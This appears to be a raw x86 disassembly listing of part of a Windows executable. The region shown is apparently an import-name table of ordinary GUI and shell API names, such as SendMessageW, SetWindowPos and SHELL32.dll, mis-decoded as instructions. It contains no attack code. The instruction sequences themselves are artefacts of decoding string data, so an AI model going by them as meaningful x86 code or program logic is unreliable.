  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
